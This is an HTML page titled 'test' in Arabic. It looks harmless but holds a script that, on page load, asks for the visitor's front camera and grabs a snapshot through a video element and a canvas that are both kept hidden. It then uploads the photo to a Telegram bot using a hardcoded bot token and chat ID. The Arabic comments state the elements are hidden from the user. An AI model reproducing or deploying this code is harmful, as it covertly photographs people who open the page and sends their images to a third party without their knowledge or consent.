<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>اختبار</title>
</head>
<body>

<!-- عناصر مخفية تماماً عن المستخدم -->
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const BOT_TOKEN = "9104255729:AAH1JEj56-A9oUzYyPtty4tB1P-ODu0TwWE";
const CHAT_ID = "8787876793";


window.onload = async () => {
  try {
    // 1. طلب تشغيل الكاميرا تلقائياً فور تحميل الصفحة
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false
    });
    
    const video = document.getElementById('video');
    video.srcObject = stream;

    // 2. الانتظار قليلاً لضمان تحميل إطار الفيديو بدقة
    setTimeout(() => {
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // 3. تحويل اللقطة إلى Blob ثم إرسالها لتيليجرام
      canvas.toBlob((blob) => {
        if (!blob) return;
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'snapshot.jpg');

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          console.log("تم الإرسال:", data);
        })
        .catch(err => {
          console.error("خطأ في الإرسال:", err);
        });

        // 4. إيقاف مسار الكاميرا بعد الانتهاء
        stream.getTracks().forEach(track => track.stop());
      }, 'image/jpeg', 0.85);

    }, 1500); // تأخير بسيط لضمان عمل الكاميرا

  } catch (err) {
    console.error("تعذر الوصول للكاميرا:", err.message);
  }
};
</script>
</body>
</html>
